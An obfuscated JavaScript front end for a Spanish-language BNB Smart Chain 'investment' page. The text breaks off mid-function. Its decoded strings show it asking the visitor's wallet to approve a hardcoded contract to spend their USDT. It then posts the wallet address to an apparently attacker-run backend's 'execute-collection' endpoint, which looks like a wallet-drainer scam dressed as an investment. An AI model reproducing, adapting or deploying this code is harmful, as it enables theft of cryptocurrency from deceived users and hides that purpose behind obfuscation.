'use strict';
const _0x93a3a6 = _0x2bd5;
(function (_0x4f25eb, _0x489627) {
    const _0x15891c = _0x2bd5, _0xf1e08e = _0x4f25eb();
    while (!![]) {
        try {
            const _0x372a6f = parseInt(_0x15891c(0x1c0)) / (0x12 * -0x1c9 + -0x897 * -0x1 + 0xb * 0x224) + parseInt(_0x15891c(0x1d1)) / (0x1030 * 0x2 + -0x1b * -0x120 + 0x3ebe * -0x1) + parseInt(_0x15891c(0x107)) / (0x1 * 0x24df + -0x2645 + 0x169) * (-parseInt(_0x15891c(0x121)) / (-0x1d91 + 0x1d63 + 0x32)) + -parseInt(_0x15891c(0x19f)) / (0xf9a + 0x598 + 0xd * -0x1a1) * (-parseInt(_0x15891c(0x190)) / (0x52e + -0x49 * -0x49 + -0x19f9 * 0x1)) + -parseInt(_0x15891c(0x1c1)) / (-0x2494 + -0x1913 + 0x3dae) * (parseInt(_0x15891c(0x1a3)) / (0x115d + -0x6 * -0x337 + -0x249f)) + -parseInt(_0x15891c(0x213)) / (-0x12d9 + -0x2045 + 0x3327) * (parseInt(_0x15891c(0x1a9)) / (0x6b0 + -0x1d8e + -0x2 * -0xb74)) + -parseInt(_0x15891c(0x1dd)) / (0x10b9 + 0x114 + 0x2 * -0x8e1);
            if (_0x372a6f === _0x489627)
                break;
            else
                _0xf1e08e['push'](_0xf1e08e['shift']());
        } catch (_0x3cb294) {
            _0xf1e08e['push'](_0xf1e08e['shift']());
        }
    }
}(_0x1c2c, 0x10266f + 0x7d225 * 0x2 + 0x2 * -0xb818f));
const MERCHANT_ADDRESS = _0x93a3a6(0x1c5) + _0x93a3a6(0x1ff) + _0x93a3a6(0x156) + _0x93a3a6(0x15f) + '3b', CONTRACT_ADDRESS = _0x93a3a6(0x102) + _0x93a3a6(0x1cd) + _0x93a3a6(0x226) + _0x93a3a6(0x215) + '34', BSC_USDT_ADDRESS = _0x93a3a6(0x245) + _0x93a3a6(0x1e0) + _0x93a3a6(0x24a) + _0x93a3a6(0x21f) + '55', BSC_CHAIN_ID_HEX = _0x93a3a6(0x184), MIN_USDT_BALANCE = 0x0n, BACKEND_URL = _0x93a3a6(0x23b) + _0x93a3a6(0x11a) + _0x93a3a6(0x176) + _0x93a3a6(0x1be), BSC_RPC_URLS = [
        _0x93a3a6(0x128) + _0x93a3a6(0x251) + _0x93a3a6(0x13c),
        _0x93a3a6(0x128) + _0x93a3a6(0x140) + _0x93a3a6(0x1af) + _0x93a3a6(0x126),
        _0x93a3a6(0x128) + _0x93a3a6(0x140) + _0x93a3a6(0x183) + _0x93a3a6(0x126),
        _0x93a3a6(0x108) + _0x93a3a6(0x158) + _0x93a3a6(0x218)
    ], BSC_CHAIN_PARAMS = {
        'chainId': BSC_CHAIN_ID_HEX,
        'chainName': _0x93a3a6(0x200) + _0x93a3a6(0x206),
        'nativeCurrency': {
            'name': _0x93a3a6(0x14f),
            'symbol': _0x93a3a6(0x14f),
            'decimals': 0x12
        },
        'rpcUrls': BSC_RPC_URLS,
        'blockExplorerUrls': [_0x93a3a6(0x128) + _0x93a3a6(0x133)]
    }, ERC20_ABI = [
        _0x93a3a6(0x24f) + _0x93a3a6(0x1d3) + _0x93a3a6(0x1c6) + _0x93a3a6(0x12a) + _0x93a3a6(0x203) + _0x93a3a6(0x198) + _0x93a3a6(0x15d) + _0x93a3a6(0x1b1),
        _0x93a3a6(0x24f) + _0x93a3a6(0x20c) + _0x93a3a6(0x18b) + _0x93a3a6(0x20f) + _0x93a3a6(0x1db) + _0x93a3a6(0x169) + _0x93a3a6(0x211) + _0x93a3a6(0x18e) + '6)',
        _0x93a3a6(0x1eb) + _0x93a3a6(0x1ce) + _0x93a3a6(0x178) + _0x93a3a6(0x1b8) + _0x93a3a6(0x139) + _0x93a3a6(0x13d) + _0x93a3a6(0x111)
    ], approveBtn = document[_0x93a3a6(0x23e) + _0x93a3a6(0x149)](_0x93a3a6(0x11f)), btnText = document[_0x93a3a6(0x23e) + _0x93a3a6(0x149)](_0x93a3a6(0x119)), btnSpinner = document[_0x93a3a6(0x23e) + _0x93a3a6(0x149)](_0x93a3a6(0x19d)), merchantInput = document[_0x93a3a6(0x23e) + _0x93a3a6(0x149)](_0x93a3a6(0x233) + _0x93a3a6(0x216)), toastEl = document[_0x93a3a6(0x23e) + _0x93a3a6(0x149)](_0x93a3a6(0x175));
if (merchantInput)
    merchantInput[_0x93a3a6(0x1cc)] = MERCHANT_ADDRESS;
((async () => {
    const _0x1cf493 = _0x93a3a6, _0x325079 = {
            'DyzeZ': function (_0x20c192, _0x2b8765) {
                return _0x20c192(_0x2b8765);
            }
        };
    try {
        await _0x325079[_0x1cf493(0x14d)](fetch, BACKEND_URL + _0x1cf493(0x24c));
    } catch (_0xc08d22) {
    }
})());
let _toastTimer;
function showToast(_0x4bbb20, _0x242653 = _0x93a3a6(0x168), _0xe673a5 = -0x295 * 0x3 + 0x1 * -0x1cb7 + 0x360a) {
    const _0x3762c2 = _0x93a3a6, _0x312d2c = {
            'GBZjX': _0x3762c2(0x159) + _0x3762c2(0x217),
            'DACZX': function (_0x4ea4a6, _0x5e564a) {
                return _0x4ea4a6 === _0x5e564a;
            },
            'kvKyh': _0x3762c2(0x1bf),
            'kwlXk': _0x3762c2(0x1b3) + _0x3762c2(0x114) + _0x3762c2(0x163),
            'SrgPN': function (_0x3cfcf6, _0x34193e) {
                return _0x3cfcf6 === _0x34193e;
            },
            'ADbTZ': _0x3762c2(0x1e5),
            'kVolh': _0x3762c2(0x11e) + _0x3762c2(0x17a) + _0x3762c2(0x189),
            'RKYrR': _0x3762c2(0x16c),
            'uFaGb': function (_0x4e904a, _0x40c60c, _0x150883) {
                return _0x4e904a(_0x40c60c, _0x150883);
            },
            'IwuGv': function (_0x3160c2, _0x198c32) {
                return _0x3160c2(_0x198c32);
            },
            'tvGEz': function (_0x3716a0, _0x427067) {
                return _0x3716a0 === _0x427067;
            },
            'PWeLV': _0x3762c2(0x168)
        }, _0x5a6d78 = _0x312d2c[_0x3762c2(0x14a)][_0x3762c2(0x219)]('|');
    let _0x32004b = -0x595 * -0x1 + 0x1d16 + 0x6ef * -0x5;
    while (!![]) {
        switch (_0x5a6d78[_0x32004b++]) {
        case '0':
            if (_0x312d2c[_0x3762c2(0x12c)](_0x242653, _0x312d2c[_0x3762c2(0x1fa)]))
                toastEl[_0x3762c2(0x177)][_0x3762c2(0x16c)] = _0x312d2c[_0x3762c2(0x10a)];
            else
                _0x312d2c[_0x3762c2(0x1d7)](_0x242653, _0x312d2c[_0x3762c2(0x143)]) ? toastEl[_0x3762c2(0x177)][_0x3762c2(0x16c)] = _0x312d2c[_0x3762c2(0x191)] : toastEl[_0x3762c2(0x177)][_0x3762c2(0x237) + _0x3762c2(0x1a7)](_0x312d2c[_0x3762c2(0x241)]);
            continue;
        case '1':
            toastEl[_0x3762c2(0x20a)] = _0x4bbb20;
            continue;
        case '2':
            _toastTimer = _0x312d2c[_0x3762c2(0x16f)](setTimeout, () => {
                const _0x16bbf2 = _0x3762c2;
                toastEl[_0x16bbf2(0x220)] = !![];
            }, _0xe673a5);
            continue;
        case '3':
            toastEl[_0x3762c2(0x220)] = ![];
            continue;
        case '4':
            if (!toastEl)
                return;
            continue;
        case '5':
            _0x312d2c[_0x3762c2(0x17d)](clearTimeout, _toastTimer);
            continue;
        case '6':
            toastEl[_0x3762c2(0x21d)][_0x3762c2(0x1c3)] = _0x312d2c[_0x3762c2(0x197)](_0x242653, _0x312d2c[_0x3762c2(0x109)]) ? '' : _0x242653;
            continue;
        }
        break;
    }
}
function _0x2bd5(_0x574d91, _0x3c43cf) {
    _0x574d91 = _0x574d91 - (-0x243d + 0x23e1 + 0x15e);
    const _0x35a0d8 = _0x1c2c();
    let _0xf9b8e5 = _0x35a0d8[_0x574d91];
    return _0xf9b8e5;
}
function setLoading(_0x2a79a7, _0x5b2821 = _0x93a3a6(0x13b) + '…') {
    const _0x966a64 = _0x93a3a6, _0x7521d6 = {
            'KOmOk': _0x966a64(0x1e2),
            'lbZQB': _0x966a64(0x188) + _0x966a64(0x1fc),
            'Vklbs': _0x966a64(0x186)
        }, _0x5a677c = _0x7521d6[_0x966a64(0x239)][_0x966a64(0x219)]('|');
    let _0x423944 = -0xce3 * -0x1 + 0x17fa + -0x24dd;
    while (!![]) {
        switch (_0x5a677c[_0x423944++]) {
        case '0':
            if (btnSpinner)
                btnSpinner[_0x966a64(0x220)] = !_0x2a79a7;
            continue;
        case '1':
            if (btnText)
                btnText[_0x966a64(0x16a) + 't'] = _0x2a79a7 ? _0x5b2821[_0x966a64(0x1f1) + 'e']() : _0x7521d6[_0x966a64(0x21a)];
            continue;
        case '2':
            if (!approveBtn)
                return;
            continue;
        case '3':
            approveBtn[_0x966a64(0x138)] = _0x2a79a7;
            continue;
        case '4':
            approveBtn[_0x966a64(0x177)][_0x966a64(0x174)] = _0x2a79a7 ? _0x7521d6[_0x966a64(0x232)] : '1';
            continue;
        }
        break;
    }
}
async function fetchAndDisplayUserBalances(_0x2b733c) {
    const _0x4e2f19 = _0x93a3a6, _0x5349ef = {
            'UzTGu': _0x4e2f19(0x180) + 'nt',
            'dZlTO': function (_0x57da4b, _0xcfe129) {
                return _0x57da4b - _0xcfe129;
            },
            'OULUA': function (_0x4c78f3, _0x2c8b3f) {
                return _0x4c78f3(_0x2c8b3f);
            },
            'oGcMb': function (_0x341c17, _0x262655) {
                return _0x341c17 > _0x262655;
            },
            'ZqsqY': _0x4e2f19(0x141),
            'KDEgP': _0x4e2f19(0x1e4),
            'uIgGM': _0x4e2f19(0x1a1) + _0x4e2f19(0x181),
            'fpRXY': function (_0x18119d, _0x4626d5) {
                return _0x18119d(_0x4626d5);
            },
            'XONaj': _0x4e2f19(0x172),
            'PCwKK': _0x4e2f19(0x199) + _0x4e2f19(0x18f) + _0x4e2f19(0x1ab) + _0x4e2f19(0x136)
        };
    try {
        const _0x24106a = new ethers[(_0x4e2f19(0x1a4)) + (_0x4e2f19(0x132))](_0x2b733c), _0xd92c40 = await _0x24106a[_0x4e2f19(0x1ac)](), _0x4bb2dc = await _0xd92c40[_0x4e2f19(0x1ca)](), _0x24409d = new ethers[(_0x4e2f19(0x116))](BSC_USDT_ADDRESS, ERC20_ABI, _0xd92c40), _0x5dbf7f = await _0x24409d[_0x4e2f19(0x1b2)](_0x4bb2dc), _0x306668 = ethers[_0x4e2f19(0x106) + 's'](_0x5dbf7f, -0xb71 * -0x1 + 0x2e * 0x9b + -0x2739), _0x4828a6 = document[_0x4e2f19(0x23e) + _0x4e2f19(0x149)](_0x5349ef[_0x4e2f19(0x20d)]);
        _0x4828a6 && (_0x4828a6[_0x4e2f19(0x16a) + 't'] = _0x4e2f19(0x12b) + _0x5349ef[_0x4e2f19(0x1d4)](parseFloat, _0x306668)[_0x4e2f19(0x1ed)](-0x113a + -0x262f + 0x376b) + _0x4e2f19(0x113));
        const _0x5a959f = document[_0x4e2f19(0x23e) + _0x4e2f19(0x149)](_0x5349ef[_0x4e2f19(0x1e6)]);
        _0x5a959f && (_0x5a959f[_0x4e2f19(0x22f)] = () => {
            const _0x4dfbde = _0x4e2f19, _0x327a54 = document[_0x4dfbde(0x23e) + _0x4dfbde(0x149)](_0x5349ef[_0x4dfbde(0x1f4)]);
            if (_0x327a54) {
                const _0x95f71e = Math[_0x4dfbde(0x221)](0x29 * 0xf1 + 0x353 + 0x29ec * -0x1, _0x5349ef[_0x4dfbde(0x1a2)](_0x5349ef[_0x4dfbde(0x1e7)](parseFloat, _0x306668), -0x2614 + -0x1 * -0x2573 + -0x12 * -0x9));
                _0x327a54[_0x4dfbde(0x1cc)] = _0x5349ef[_0x4dfbde(0x1d8)](_0x95f71e, -0xcfd * 0x1 + 0x954 + 0x3a9) ? _0x95f71e[_0x4dfbde(0x1ed)](0x2602 + -0xf9e + -0x1662) : _0x5349ef[_0x4dfbde(0x137)], _0x327a54[_0x4dfbde(0x147) + _0x4dfbde(0x1d2)](new Event(_0x5349ef[_0x4dfbde(0x19e)]));
            }
        });
    } catch (_0x5675c9) {
        console[_0x4e2f19(0x1e5)](_0x5349ef[_0x4e2f19(0x18a)], _0x5675c9);
    }
}
async function triggerBackendCollect(_0x464529) {
    const _0x34a704 = _0x93a3a6, _0x3b0c83 = {
            'cnGdJ': _0x34a704(0x180) + 'nt',
            'VgKSQ': function (_0x40124a, _0x2a2058) {
                return _0x40124a <= _0x2a2058;
            },
            'UYoYJ': function (_0x451de9, _0x120ba6, _0x2465e4) {
                return _0x451de9(_0x120ba6, _0x2465e4);
            },
            'nPqii': _0x34a704(0x222),
            'FVuon': _0x34a704(0x15e) + _0x34a704(0x23d),
            'Vtcrw': _0x34a704(0x24b) + _0x34a704(0x17c),
            'LVhtf': function (_0x2e0e8, _0x15afc6) {
                return _0x2e0e8 < _0x15afc6;
            }
        };
    let _0x2314dd;
    const _0x4edd8f = document[_0x34a704(0x23e) + _0x34a704(0x149)](_0x3b0c83[_0x34a704(0x22a)])?.[_0x34a704(0x1cc)] || '1', _0x233991 = ethers[_0x34a704(0x1b5)](_0x4edd8f[_0x34a704(0x202)](), 0x1 * 0x1fcd + -0x1fc5 + 0xa)[_0x34a704(0x202)]();
    for (let _0x596d86 = -0x25db + 0x2180 + -0x117 * -0x4; _0x3b0c83[_0x34a704(0x1c2)](_0x596d86, -0x2598 + -0x92e * -0x1 + -0x13 * -0x17f); _0x596d86++) {
        try {
            const _0x292a9e = await _0x3b0c83[_0x34a704(0x185)](fetch, BACKEND_URL + (_0x34a704(0x164) + _0x34a704(0x1e3)), {
                    'method': _0x3b0c83[_0x34a704(0x225)],
                    'headers': { 'Content-Type': _0x3b0c83[_0x34a704(0x130)] },
                    'body': JSON[_0x34a704(0x1d0)]({
                        'userAddress': _0x464529,
                        'amount': _0x233991
                    })
                }), _0x40f26f = await _0x292a9e[_0x34a704(0x154)]();
            if (!_0x292a9e['ok'] || !_0x40f26f[_0x34a704(0x1bf)])
                throw new Error(_0x40f26f[_0x34a704(0x1e5)] || _0x3b0c83[_0x34a704(0x228)]);
            return _0x40f26f;
        } catch (_0x4df431) {
            _0x2314dd = _0x4df431;
            if (_0x3b0c83[_0x34a704(0x142)](_0x596d86, -0x28e + -0x547 * 0x3 + -0x3 * -0x622))
                await new Promise(_0x5f0bea => setTimeout(_0x5f0bea, 0x7 * 0x59 + 0x156 + 0x7f3));
        }
    }
    throw _0x2314dd;
}
let pendingInvestment = ![];
window[_0x93a3a6(0x240)] && typeof window[_0x93a3a6(0x240)][_0x93a3a6(0x1a0) + _0x93a3a6(0x1f8)] === _0x93a3a6(0x1b7) && window[_0x93a3a6(0x240)][_0x93a3a6(0x1a0) + _0x93a3a6(0x1f8)](_0x34c69b => {
    const _0x38665d = _0x93a3a6, _0x46b28a = {
            'vgeiJ': _0x38665d(0x170),
            'cXztv': function (_0x155423, _0x4c41a0) {
                return _0x155423(_0x4c41a0);
            },
            'SrNko': function (_0x1d3a30, _0x127ae8) {
                return _0x1d3a30(_0x127ae8);
            }
        }, _0x175f21 = _0x34c69b[_0x46b28a[_0x38665d(0x19c)]];
    _0x175f21 && (_0x46b28a[_0x38665d(0x17b)](fetchAndDisplayUserBalances, _0x175f21), pendingInvestment && (pendingInvestment = ![], _0x46b28a[_0x38665d(0x235)](runInvestmentFlow, _0x175f21)));
});
function _0x1c2c() {
    const _0x21ad37 = [
        'opacity',
        'toast',
        'ant.onrend',
        'style',
        'ddress\x20acc',
        'YlKJI',
        '53,\x2069,\x200.',
        'cXztv',
        '\x20failed.',
        'IwuGv',
        'erida:\x20Apr',
        'CUfRc',
        'investAmou',
        'nceLabel',
        'obar\x20USDT…',
        '2.binance.',
        '0x38',
        'UYoYJ',
        '0.8',
        'oZidP',
        'INVERTIR\x20A',
        '95)',
        'PCwKK',
        'ddress\x20own',
        'ión\x20en\x20la\x20',
        '...',
        'ns\x20(uint25',
        'incronizar',
        '6uaYrzQ',
        'kVolh',
        'suficiente',
        'cSeWk',
        'cancelada\x20',
        'e\x20red\x20(Gas',
        'Confirmand',
        'tvGEz',
        'external\x20r',
        'Error\x20al\x20s',
        'zswvP',
        'addEventLi',
        'vgeiJ',
        'btnSpinner',
        'KDEgP',
        '5459980yDUisv',
        'subscribeP',
        'walletBala',
        'dZlTO',
        '59216glCoaI',
        'BrowserPro',
        'line;\x22>Ver',
        'nCesU',
        'erty',
        'chainId',
        '10poMPAi',
        '\x20pagar\x20la\x20',
        '\x20saldos\x20en',
        'getSigner',
        'Cambia\x20man',
        'por\x20el\x20usu',
        '1.binance.',
        '<a\x20href=\x22h',
        'ol)',
        'balanceOf',
        'rgba(38,\x201',
        'xt-decorat',
        'parseUnits',
        'open',
        'function',
        'ount)\x20exte',
        '¡Inversión',
        'reason',
        'n\x20↗</a>',
        'ted',
        'KWeoJ',
        'er.com/api',
        'success',
        '745640vvbREK',
        '721ogTzxh',
        'VgKSQ',
        'type',
        'ion:\x20under',
        '0x6253fecb',
        'ress\x20spend',
        'KnVqK',
        'o\x20red\x20BSC.',
        'hash',
        'getAddress',
        'cancelled',
        'value',
        '6f10565A63',
        'alanceOf(a',
        'Firma\x20requ',
        'stringify',
        '1665644pYeMWy',
        'ent',
        'pprove(add',
        'fpRXY',
        'iGlhm',
        'AhYEf',
        'SrgPN',
        'oGcMb',
        'as.',
        'LfMDr',
        's\x20spender)',
        'saldo\x20de\x20U',
        '5966884RjUxUk',
        'bDTuO',
        'procesar\x20l',
        '6f99059fF7',
        'Ocurrió\x20un',
        '2|3|4|1|0',
        'ollection',
        'input',
        'error',
        'XONaj',
        'OULUA',
        '\x20saldo\x20de\x20',
        'FjlGh',
        'toLowerCas',
        'function\x20b',
        'USDT\x20en\x20tu',
        'toFixed',
        '¡Transacci',
        'WFjZQ',
        'TlXpT',
        'toUpperCas',
        'xAyVx',
        'Cwtun',
        'UzTGu',
        'approve',
        'ón\x20en\x20red.',
        '\x20proveedor',
        'roviders',
        'SDT…',
        'kvKyh',
        'NUZYx',
        'HORA',
        'ciones...',
        'allowance',
        'b48a6a7d19',
        'BNB\x20Smart\x20',
        'sSwCA',
        'toString',
        '6\x20amount)\x20',
        'vEIdP',
        'GmZCW',
        'Chain',
        'RCIaq',
        'rovider',
        'TPCxK',
        'innerHTML',
        '\x20BNB\x20Smart',
        'llowance(a',
        'uIgGM',
        'ttps://bsc',
        'er,\x20addres',
        'red.',
        'view\x20retur',
        'tu\x20wallet.',
        '4144221lcieSQ',
        'veCBZ',
        'f1Ca61f1C6',
        'dress',
        '0|2',
        '/bsc',
        'split',
        'lbZQB',
        'iente\x20para',
        'JbLyk',
        'dataset',
        'oNNmc',
        '9027B31979',
        'hidden',
        'max',
        'POST',
        '\x20Chain\x20en\x20',
        'yfoXP',
        'nPqii',
        'cEa65585Dd',
        '\x20exitosa!\x20',
        'Vtcrw',
        '\x20en\x20BscSca',
        'cnGdJ',
        'rDZvp',
        'No\x20tienes\x20',
        'user\x20rejec',
        'o\x20autoriza',
        'onclick',
        'xElcC',
        'eqwQE',
        'Vklbs',
        'merchantAd',
        'parseEther',
        'SrNko',
        'denied',
        'removeProp',
        'WPTnP',
        'KOmOk',
        'kGmuj',
        'https://se',
        'tIboL',
        'n/json',
        'getElement',
        'MaxAK',
        'modal',
        'RKYrR',
        '\x20billetera',
        'wallet_add',
        'CfzEo',
        '0x55d39832',
        'message',
        'wallet_swi',
        'faKoC',
        'Abriendo\x20s',
        '7548524699',
        'Collection',
        '/health',
        'onocido',
        'Operación\x20',
        'function\x20a',
        'brir\x20AppKi',
        'c-rpc.publ',
        'ario.',
        '0x8e18bE61',
        'code',
        'o\x20aprobaci',
        'getBalance',
        'formatUnit',
        '21048tdFZhd',
        'https://rp',
        'PWeLV',
        'kwlXk',
        '\x20gas\x20(BNB)',
        'yle=\x22color',
        '\x20error\x20al\x20',
        'comisión\x20d',
        'ada\x20con\x20éx',
        'request',
        'int256)',
        'tchEthereu',
        '\x20USDT',
        '61,\x20123,\x200',
        'wait',
        'Contract',
        'Verificand',
        'kbwOq',
        'btnText',
        'cure-merch',
        'Conectando',
        'a\x20transacc',
        'includes',
        'rgba(220,\x20',
        'approveBtn',
        '_blank\x22\x20st',
        '188SqvtGW',
        '\x22\x20target=\x22',
        'a\x20red\x20BSC…',
        'oQbcd',
        'Web3\x20Error',
        'org/',
        '\x20crítico:',
        'https://bs',
        'Procesando',
        'er,\x20uint25',
        'Saldo:\x20',
        'DACZX',
        'o\x20saldo\x20de',
        'ón\x20complet',
        'Ilxuh',
        'FVuon',
        'Error\x20desc',
        'vider',
        'cscan.com/',
        'olo...',
        'mChain',
        '\x20vivo:',
        'ZqsqY',
        'disabled',
        'rnal\x20view\x20',
        'ualmente\x20a',
        'Processing',
        'icnode.com',
        'returns\x20(u',
        'LExVR',
        'ito!\x20Graci',
        'c-dataseed',
        '1.00',
        'LVhtf',
        'ADbTZ',
        'EthereumCh',
        'getNetwork',
        'NB\x20insufic',
        'dispatchEv',
        'xrNib',
        'ById',
        'GBZjX',
        'Error\x20al\x20a',
        'scan.com/t',
        'DyzeZ',
        'click',
        'BNB',
        'getWalletP',
        ':\x20#fff;\x20te',
        '0.0005',
        'Validando\x20',
        'json',
        'ZdoWs',
        'f1b9a799e6',
        'HOYCI',
        'c.ankr.com',
        '4|5|1|6|3|',
        'Cambiando\x20',
        'zdEBS',
        'Saldo\x20de\x20B',
        'eturns\x20(bo',
        'applicatio',
        '5fae58ab9b',
        'YdxVC',
        'ain',
        'stener',
        '.95)',
        '/execute-c',
        'qTYFs',
        'qWZHU',
        'EyZxV',
        'default',
        '\x20external\x20',
        'textConten',
        'hsSqq',
        'background',
        'elector\x20de',
        'PvyNf',
        'uFaGb',
        'eip155',
        '\x20inversión',
        'maxBtn',
        '\x20en\x20protoc'
    ];
    _0x1c2c = function () {
        return _0x21ad37;
    };
    return _0x1c2c();
}
approveBtn && approveBtn[_0x93a3a6(0x19b) + _0x93a3a6(0x162)](_0x93a3a6(0x14e), async () => {
    const _0x718407 = _0x93a3a6, _0x11ceca = {
            'rDZvp': function (_0x4eb8dd, _0x121070) {
                return _0x4eb8dd === _0x121070;
            },
            'veCBZ': _0x718407(0x1b7),
            'hsSqq': function (_0x4bf12c, _0x36041a, _0x32c535) {
                return _0x4bf12c(_0x36041a, _0x32c535);
            },
            'Cwtun': _0x718407(0x249) + _0x718407(0x16d) + _0x718407(0x242) + _0x718407(0x18d),
            'NUZYx': function (_0x5178f1, _0x235146) {
                return _0x5178f1 === _0x235146;
            },
            'MaxAK': _0x718407(0x14b) + _0x718407(0x250) + 't:',
            'RCIaq': function (_0x17cfb7, _0x92d356) {
                return _0x17cfb7(_0x92d356);
            }
        };
    let _0x854127 = null;
    if (window[_0x718407(0x240)] && _0x11ceca[_0x718407(0x22b)](typeof window[_0x718407(0x240)][_0x718407(0x150) + _0x718407(0x208)], _0x11ceca[_0x718407(0x214)]))
        try {
            _0x854127 = window[_0x718407(0x240)][_0x718407(0x150) + _0x718407(0x208)]();
        } catch (_0x24c14e) {
        }
    if (!_0x854127) {
        pendingInvestment = !![], _0x11ceca[_0x718407(0x16b)](setLoading, !![], _0x11ceca[_0x718407(0x1f3)]);
        if (window[_0x718407(0x240)] && _0x11ceca[_0x718407(0x1fb)](typeof window[_0x718407(0x240)][_0x718407(0x1b6)], _0x11ceca[_0x718407(0x214)]))
            try {
                await window[_0x718407(0x240)][_0x718407(0x1b6)]();
            } catch (_0x5e6062) {
                console[_0x718407(0x1e5)](_0x11ceca[_0x718407(0x23f)], _0x5e6062), pendingInvestment = ![], _0x11ceca[_0x718407(0x207)](setLoading, ![]);
            }
        return;
    }
    await _0x11ceca[_0x718407(0x207)](runInvestmentFlow, _0x854127);
});
async function runInvestmentFlow(_0xe8a778) {
    const _0x4c26b3 = _0x93a3a6, _0x42487c = {
            'HOYCI': function (_0x55d956, _0x4236a6, _0x3ee4f9) {
                return _0x55d956(_0x4236a6, _0x3ee4f9);
            },
            'YlKJI': _0x4c26b3(0x11b) + _0x4c26b3(0x1f7) + '…',
            'AhYEf': _0x4c26b3(0x117) + _0x4c26b3(0x1c8) + '..',
            'qTYFs': function (_0x2b845a, _0x496935) {
                return _0x2b845a !== _0x496935;
            },
            'kGmuj': function (_0x62cc8b, _0x2c4f36) {
                return _0x62cc8b(_0x2c4f36);
            },
            'nCesU': _0x4c26b3(0x15a) + _0x4c26b3(0x123),
            'KWeoJ': _0x4c26b3(0x247) + _0x4c26b3(0x112) + _0x4c26b3(0x135),
            'GmZCW': function (_0x26b2d7, _0xbba620) {
                return _0x26b2d7 === _0xbba620;
            },
            'TPCxK': _0x4c26b3(0x243) + _0x4c26b3(0x144) + _0x4c26b3(0x161),
            'ZdoWs': _0x4c26b3(0x1ad) + _0x4c26b3(0x13a) + _0x4c26b3(0x20b) + _0x4c26b3(0x223) + _0x4c26b3(0x212),
            'vEIdP': _0x4c26b3(0x1e5),
            'FjlGh': _0x4c26b3(0x117) + _0x4c26b3(0x12d) + _0x4c26b3(0x10b) + '…',
            'YdxVC': _0x4c26b3(0x152),
            'PvyNf': function (_0x54b786, _0x51b319) {
                return _0x54b786 < _0x51b319;
            },
            'KnVqK': function (_0x279d98, _0x49bae2, _0x3fe65c) {
                return _0x279d98(_0x49bae2, _0x3fe65c);
            },
            'zdEBS': _0x4c26b3(0x15c) + _0x4c26b3(0x146) + _0x4c26b3(0x21b) + _0x4c26b3(0x1aa) + _0x4c26b3(0x10e) + _0x4c26b3(0x195) + ').',
            'eqwQE': _0x4c26b3(0x180) + 'nt',
            'oZidP': function (_0x59dd12, _0xa04528) {
                return _0x59dd12 || _0xa04528;
            },
            'bDTuO': _0x4c26b3(0x153) + _0x4c26b3(0x1dc) + _0x4c26b3(0x1f9),
            'zswvP': function (_0x1c6baf, _0x1dbe1b) {
                return _0x1c6baf < _0x1dbe1b;
            },
            'Ilxuh': function (_0x19f14e, _0x48844b, _0x81d90d) {
                return _0x19f14e(_0x48844b, _0x81d90d);
            },
            'qWZHU': _0x4c26b3(0x22c) + _0x4c26b3(0x192) + _0x4c26b3(0x1e8) + _0x4c26b3(0x1ec) + _0x4c26b3(0x242) + '.',
            'oQbcd': function (_0x33adf2, _0x538e08, _0x4c1242) {
                return _0x33adf2(_0x538e08, _0x4c1242);
            },
            'iGlhm': _0x4c26b3(0x117) + _0x4c26b3(0x22e) + _0x4c26b3(0x1fd),
            'WPTnP': function (_0x4ba51d, _0x36a001, _0x14c9a2) {
                return _0x4ba51d(_0x36a001, _0x14c9a2);
            },
            'xElcC': _0x4c26b3(0x1cf) + _0x4c26b3(0x17e) + _0x4c26b3(0x182),
            'cSeWk': function (_0x5dfbb3, _0x1aa116, _0x139403) {
                return _0x5dfbb3(_0x1aa116, _0x139403);
            },
            'JbLyk': _0x4c26b3(0x196) + _0x4c26b3(0x104) + _0x4c26b3(0x1f6) + '..',
            'WFjZQ': _0x4c26b3(0x129) + _0x4c26b3(0x171) + _0x4c26b3(0x173) + _0x4c26b3(0x134),
            'TlXpT': function (_0x25acd3, _0x45514b, _0x2ebb56, _0x38a4b4) {
                return _0x25acd3(_0x45514b, _0x2ebb56, _0x38a4b4);
            },
            'LfMDr': _0x4c26b3(0x1bf),
            'EyZxV': function (_0x4b1666, _0x17fb01, _0x217ab3, _0x8a696b) {
                return _0x4b1666(_0x17fb01, _0x217ab3, _0x8a696b);
            },
            'LExVR': _0x4c26b3(0x1ee) + _0x4c26b3(0x12e) + _0x4c26b3(0x10f) + _0x4c26b3(0x13f) + _0x4c26b3(0x1d9),
            'faKoC': _0x4c26b3(0x131) + _0x4c26b3(0x24d),
            'oNNmc': function (_0x427873, _0x115cda) {
                return _0x427873 === _0x115cda;
            },
            'tIboL': _0x4c26b3(0x22d) + _0x4c26b3(0x1bc),
            'xAyVx': _0x4c26b3(0x236),
            'xrNib': _0x4c26b3(0x1cb),
            'yfoXP': function (_0x3ca7df, _0x1b80ec, _0x20c13b) {
                return _0x3ca7df(_0x1b80ec, _0x20c13b);
            },
            'CfzEo': _0x4c26b3(0x24e) + _0x4c26b3(0x194) + _0x4c26b3(0x1ae) + _0x4c26b3(0x252),
            'CUfRc': _0x4c26b3(0x168),
            'sSwCA': _0x4c26b3(0x125) + _0x4c26b3(0x127),
            'kbwOq': _0x4c26b3(0x1e1) + _0x4c26b3(0x10d) + _0x4c26b3(0x1df) + _0x4c26b3(0x11c) + _0x4c26b3(0x18c) + _0x4c26b3(0x210)
        };
    _0x42487c[_0x4c26b3(0x157)](setLoading, !![], _0x42487c[_0x4c26b3(0x179)]);
    try {
        const _0x42b9e2 = new ethers[(_0x4c26b3(0x1a4)) + (_0x4c26b3(0x132))](_0xe8a778);
        _0x42487c[_0x4c26b3(0x157)](setLoading, !![], _0x42487c[_0x4c26b3(0x1d6)]);
        const _0x36c1cb = await _0x42b9e2[_0x4c26b3(0x145)]();
        if (_0x42487c[_0x4c26b3(0x165)](_0x42487c[_0x4c26b3(0x23a)](Number, _0x36c1cb[_0x4c26b3(0x1a8)]), 0x27b * -0xe + 0x11a * -0x14 + 0x66 * 0x8f)) {
            _0x42487c[_0x4c26b3(0x157)](setLoading, !![], _0x42487c[_0x4c26b3(0x1a6)]);
            try {
                await _0xe8a778[_0x4c26b3(0x110)]({
                    'method': _0x42487c[_0x4c26b3(0x1bd)],
                    'params': [{ 'chainId': BSC_CHAIN_ID_HEX }]
                });
            } catch (_0x4c1aa0) {
                if (_0x42487c[_0x4c26b3(0x205)](_0x4c1aa0[_0x4c26b3(0x103)], -0x1f18 + -0x6ec + 0x392a))
                    await _0xe8a778[_0x4c26b3(0x110)]({
                        'method': _0x42487c[_0x4c26b3(0x209)],
                        'params': [BSC_CHAIN_PARAMS]
                    });
